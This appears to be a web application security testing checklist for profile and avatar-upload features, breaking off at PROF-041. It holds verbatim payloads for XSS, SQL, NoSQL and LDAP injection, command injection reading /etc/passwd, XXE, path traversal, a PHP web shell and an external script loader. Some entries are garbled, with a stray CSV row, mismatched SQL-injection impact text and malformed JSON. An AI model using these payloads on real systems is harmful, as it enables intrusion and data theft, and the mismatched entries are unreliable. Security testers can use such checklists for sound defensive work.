# 2. User Profile & Settings — Checklist

Feature-area security **test cases** for “2. User Profile & Settings”. Functionality-driven checklist mapped to the per-attack kits; impact-first with severity + CVSS.

*172 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## PROF-001 — IDOR on Profile View
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Login as User A 2. Capture profile view request 3. Replace user ID with User B's ID 4. Observe response

**Expected Result:** Application should deny access to other users' private profile data

**Payload Example:**

```
GET /api/user/profile?id=12345 -> Change to id=12346
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / OWASP ZAP / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## PROF-002 — IDOR on Profile Edit
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Login as User A 2. Capture profile update request 3. Modify user ID parameter to User B 4. Submit modified request

**Expected Result:** Application should reject unauthorized profile modifications

**Payload Example:**

```
PUT /api/user/12346/profile {"name":"Hacked"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / curl

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## PROF-003 — Stored XSS in Display Name
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Navigate to profile edit 2. Insert XSS payload in name field 3. Save profile 4. View profile as another user

**Expected Result:** Application should sanitize and encode output properly

**Payload Example:**

```
<script>alert(document.cookie)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter / Browser DevTools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## PROF-004 — Stored XSS in Bio/About Section
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Edit profile bio field 2. Insert XSS payload 3. Save and view profile 4. Check if script executes

**Expected Result:** Application should sanitize all user-controlled inputs

**Payload Example:**

```
<img src=x onerror=alert('XSS')>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter / DOMPurify Bypass

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## PROF-005 — HTML Injection in Profile Fields
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Insert HTML tags in profile fields 2. Save profile 3. View rendered profile

**Expected Result:** HTML should be escaped or stripped

**Payload Example:**

```
<h1>Injected</h1><iframe src="evil.com">
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## PROF-006 — SQL Injection in Profile Search
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Search for user profiles 2. Insert SQL payload in search parameter 3. Observe response and timing

**Expected Result:** Application should use parameterized queries

**Payload Example:**

```
'; SELECT * FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite / Havij

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## PROF-007 — NoSQL Injection in Profile Query
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Capture profile request 2. Inject NoSQL operators 3. Observe response

**Expected Result:** Application should sanitize NoSQL queries

**Payload Example:**

```
{"$gt":""}
```

**Impact:** NoSQL operator injection -&gt; authentication bypass / cross-user data disclosure.

**Tools:** NoSQLMap / Burp Suite / MongoDB Compass

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger NoSQL injection

---

## PROF-008 — CSRF on Profile Update
**Test Category:** Cross-Site Request Forgery · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Create malicious HTML page with profile update form 2. Trick victim to visit 3. Check if profile updated

**Expected Result:** Application should require valid CSRF token

**Payload Example:**

```
<form action="https://target.com/profile/update" method="POST">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## PROF-009 — Mass Assignment Vulnerability
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Capture profile update request 2. Add additional parameters like role/isAdmin 3. Submit request

**Expected Result:** Application should whitelist allowed fields

**Payload Example:**

```
{"name":"test"role:"admin"isVerified:true}
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite / Postman / Arjun

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## PROF-010 — Server-Side Template Injection in Profile
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Insert SSTI payload in profile fields 2. Save and view profile 3. Check for code execution

**Expected Result:** Application should not process user input as templates

**Payload Example:**

```
{{7*7}} or ${7*7} or <%= 7*7 %>
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite / Tplmap / SSTImap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## PROF-011 — Blind XSS in Profile Fields
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Insert blind XSS payload in all profile fields 2. Wait for admin to view profile 3. Check XSS Hunter for callbacks

**Expected Result:** Application should sanitize all outputs including admin panels

**Payload Example:**

```
><script src=https://xsshunter.com/payload.js></script>,High,XSS Hunter|Burp Collaborator|bXSS
Profile View / Edit,Parameter Tampering on Profile Fields,Business Logic,1. Capture profile update request 2. Modify field lengths/types beyond normal limits 3. Check for errors or bypasses,Application should validate all parameters server-side,{age":-1} or {"age":999999}
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Postman

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## PROF-012 — Profile Enumeration via Error Messages
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Request non-existent profile IDs 2. Compare error messages for existing vs non-existing profiles 3. Enumerate valid profiles

**Expected Result:** Error messages should be generic

**Payload Example:**

```
GET /profile/99999 vs /profile/12345
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder / ffuf / wfuzz

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## PROF-013 — Race Condition on Profile Update
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Send multiple concurrent profile update requests 2. Check for inconsistent state or duplicates 3. Analyze final profile state

**Expected Result:** Application should handle concurrent requests properly

**Payload Example:**

```
Parallel requests with different values
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Race-The-Web / Burp Repeater

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## PROF-014 — Unicode Normalization Attack
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Insert Unicode characters that normalize to special characters 2. Check for bypasses in validation

**Expected Result:** Application should normalize before validation

**Payload Example:**

```
℀ (normalizes to a/c) or ＜script＞
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## PROF-015 — Prototype Pollution via Profile Data
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Send JSON with __proto__ properties 2. Check for pollution effects

**Expected Result:** Application should not allow prototype manipulation

**Payload Example:**

```
{"__proto__":{"admin":true}}
```

**Impact:** Prototype pollution -&gt; DOM XSS (client) / RCE (server).

**Tools:** Burp Suite / Postman

**References:** CWE-1321; -&gt;[Prototype Pollution checklist](#/checklist/prototype); Olivier Arteau; PortSwigger server-side PP

---

## PROF-016 — GraphQL IDOR on Profile Query
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Capture GraphQL profile query 2. Modify user ID in query 3. Observe returned data

**Expected Result:** GraphQL should enforce authorization

**Payload Example:**

```
query { user(id: "other_user_id") { email password } }
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** GraphQL Voyager / Altair / Burp Suite

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## PROF-017 — Horizontal Privilege Escalation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Login as regular user 2. Modify profile of another regular user 3. Check if modification succeeds

**Expected Result:** Users should only modify their own profiles

**Payload Example:**

```
PUT /api/users/victim_id/profile
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## PROF-018 — Vertical Privilege Escalation
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Login as regular user 2. Try to access admin profile features 3. Modify admin-only fields

**Expected Result:** Regular users should not access admin functions

**Payload Example:**

```
{"role":"admin"permissions:["all"]}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Autorize / AuthMatrix

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## PROF-019 — XML External Entity in Profile Import
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Find profile import feature 2. Upload XML with XXE payload 3. Check for file disclosure or SSRF

**Expected Result:** Application should disable external entities

**Payload Example:**

```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite / XXEinjector / OXML_XXE

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## PROF-020 — JSON Injection in Profile Data
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Insert JSON breaking characters in profile fields 2. Check for injection effects

**Expected Result:** Application should properly escape JSON

**Payload Example:**

```
{"name":"test\"\"admin\":\"true"}
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## PROF-021 — LDAP Injection in Profile Search
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Search profiles using LDAP-backed system 2. Insert LDAP injection payload 3. Observe results

**Expected Result:** Application should sanitize LDAP queries

**Payload Example:**

```
*)(uid=*))(|(uid=*
```

**Impact:** LDAP filter injection -&gt; authentication bypass / directory data disclosure.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-90; -&gt;[LDAP Injection checklist](#/checklist/ldap); OWASP LDAP Injection; PayloadsAllTheThings

---

## PROF-022 — Command Injection via Profile Fields
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Insert OS command in profile fields 2. Check for command execution 3. Monitor for out-of-band callbacks

**Expected Result:** Application should never pass user input to system commands

**Payload Example:**

```
; cat /etc/passwd ; or | whoami
```

**Impact:** OS command injection -&gt; remote code execution / server takeover.

**Tools:** Burp Suite / Commix / Burp Collaborator

**References:** CWE-78; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger OS command injection; GTFOBins

---

## PROF-023 — Path Traversal in Profile Export
**Test Category:** Path Traversal · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Export profile data 2. Manipulate filename/path parameter 3. Try to access system files

**Expected Result:** Application should validate and sanitize file paths

**Payload Example:**

```
filename=../../../etc/passwd
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / DotDotPwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## PROF-024 — HTTP Parameter Pollution
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Send duplicate parameters with different values 2. Check which value is processed 3. Test for bypasses

**Expected Result:** Application should handle duplicate parameters consistently

**Payload Example:**

```
?id=myid&id=victimid
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite / Param Miner

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## PROF-025 — Integer Overflow in Profile ID
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Send very large integer as profile ID 2. Check for overflow or unexpected behavior

**Expected Result:** Application should validate integer bounds

**Payload Example:**

```
GET /profile/9999999999999999999999
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## PROF-026 — Null Byte Injection in Profile Fields
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Insert null bytes in profile fields 2. Check for truncation or bypasses

**Expected Result:** Application should reject or sanitize null bytes

**Payload Example:**

```
name=admin%00.jpg
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Hackvertor

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## PROF-027 — CRLF Injection in Profile Fields
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Insert CRLF characters in profile fields 2. Check for header injection or log injection

**Expected Result:** Application should sanitize CRLF characters

**Payload Example:**

```
name=test%0d%0aSet-Cookie:%20evil=value
```

**Impact:** CRLF/response-splitting -&gt; header injection, cache poisoning, session fixation.

**Tools:** Burp Suite / CRLFsuite

**References:** CWE-113; -&gt;[Host Header Injection checklist](#/checklist/hostheader); OWASP CRLF Injection; PortSwigger

---

## PROF-028 — Buffer Overflow in Profile Fields
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Send extremely long strings in profile fields 2. Monitor for crashes or errors

**Expected Result:** Application should enforce length limits

**Payload Example:**

```
name=AAAA...(10000 chars)
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## PROF-029 — Format String Vulnerability
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Insert format string specifiers in profile fields 2. Check for information disclosure

**Expected Result:** Application should not process format strings

**Payload Example:**

```
%s%s%s%s%s%s%s%s%s%s or %x%x%x%x
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## PROF-030 — Insecure Direct Object Reference via UUID
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Capture profile request with UUID 2. Generate or predict other UUIDs 3. Access other profiles

**Expected Result:** UUIDs should be random and authorization checked

**Payload Example:**

```
GET /profile/550e8400-e29b-41d4-a716-446655440000
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / uuid-tool

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## PROF-031 — JWT Token Manipulation for Profile Access
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Decode JWT token 2. Modify user ID claim 3. Re-encode with none algorithm or weak key

**Expected Result:** Application should properly validate JWT signatures

**Payload Example:**

```
{"alg":"none"} or {"sub":"admin"}
```

**Impact:** JWT forgery/verification flaw -&gt; identity spoofing, privilege escalation, full account takeover.

**Tools:** jwt_tool / Burp Suite JWT Editor / jwt.io

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT library vulns; PortSwigger JWT

---

## PROF-032 — Cache Poisoning on Profile Page
**Test Category:** Web Cache Poisoning · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Find cacheable profile endpoint 2. Inject payload via unkeyed headers 3. Poison cache for other users

**Expected Result:** Application should not cache user-specific data unsafely

**Payload Example:**

```
X-Forwarded-Host: evil.com
```

**Impact:** Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure.

**Tools:** Burp Suite / Param Miner

**References:** CWE-524; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception

---

## PROF-033 — Sensitive Data Exposure in API Response
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Profile View / Edit - profile id param / display-name / bio / editable fields

**Test Steps:** 1. Request profile via API 2. Check if sensitive fields are returned 3. Compare public vs authenticated responses

**Expected Result:** API should not expose sensitive data like passwords or tokens

**Payload Example:**

```
Check for password_hash/ssn/credit_card in response
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## PROF-034 — Unrestricted File Upload
**Test Category:** File Upload Vulnerabilities · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Avatar / Profile Picture Upload - avatar upload: filename / content-type / bytes

**Test Steps:** 1. Upload file with executable extension 2. Access uploaded file 3. Check for code execution

**Expected Result:** Application should restrict file types and validate content

**Payload Example:**

```
shell.php or shell.php.jpg
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Weevely / Upload Scanner

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## PROF-035 — File Upload with Double Extension
**Test Category:** File Upload Vulnerabilities · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Avatar / Profile Picture Upload - avatar upload: filename / content-type / bytes

**Test Steps:** 1. Upload file with double extension 2. Check if server processes first or second extension 3. Attempt code execution

**Expected Result:** Application should validate all extensions

**Payload Example:**

```
malware.php.jpg or malware.jpg.php
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Upload Scanner

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## PROF-036 — Null Byte in File Extension
**Test Category:** File Upload Vulnerabilities · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Avatar / Profile Picture Upload - avatar upload: filename / content-type / bytes

**Test Steps:** 1. Upload file with null byte before extension 2. Check if extension validation bypassed

**Expected Result:** Application should reject null bytes

**Payload Example:**

```
shell.php%00.jpg or shell.php\x00.jpg
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Hackvertor

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## PROF-037 — Content-Type Bypass
**Test Category:** File Upload Vulnerabilities · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Avatar / Profile Picture Upload - avatar upload: filename / content-type / bytes

**Test Steps:** 1. Upload executable with image Content-Type header 2. Check if server validates content vs header

**Expected Result:** Application should validate actual file content

**Payload Example:**

```
Content-Type: image/jpeg with PHP content
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / ExifTool

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## PROF-038 — Magic Bytes Bypass
**Test Category:** File Upload Vulnerabilities · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Avatar / Profile Picture Upload - avatar upload: filename / content-type / bytes

**Test Steps:** 1. Prepend image magic bytes to malicious file 2. Upload and access file 3. Check for execution

**Expected Result:** Application should validate entire file not just headers

**Payload Example:**

```
GIF89a; <?php system($_GET['cmd']); ?>
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Hexeditor

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## PROF-039 — SVG File Upload XSS
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Avatar / Profile Picture Upload - avatar upload: filename / content-type / bytes

**Test Steps:** 1. Create SVG file with embedded JavaScript 2. Upload as avatar 3. Access SVG directly

**Expected Result:** Application should sanitize SVG files or convert to raster

**Payload Example:**

```
<svg onload=alert('XSS')> or <svg><script>alert(1)</script></svg>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Custom SVG

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## PROF-040 — XXE via SVG Upload
**Test Category:** XML External Entity · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Avatar / Profile Picture Upload - avatar upload: filename / content-type / bytes

**Test Steps:** 1. Create SVG with XXE payload 2. Upload as avatar 3. Check for file disclosure

**Expected Result:** Application should disable external entities in XML parser

**Payload Example:**

```
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite / XXEinjector

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## PROF-041 — ImageMagick Exploitation
**Test Category:** Remote Code Execution · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Avatar / Profile Picture Upload - avatar upload: filename / content-type / bytes

**Test Steps:** 1. Create malicious MVG/SVG file 2. Upload as image 3. Trigger ImageMagick processing

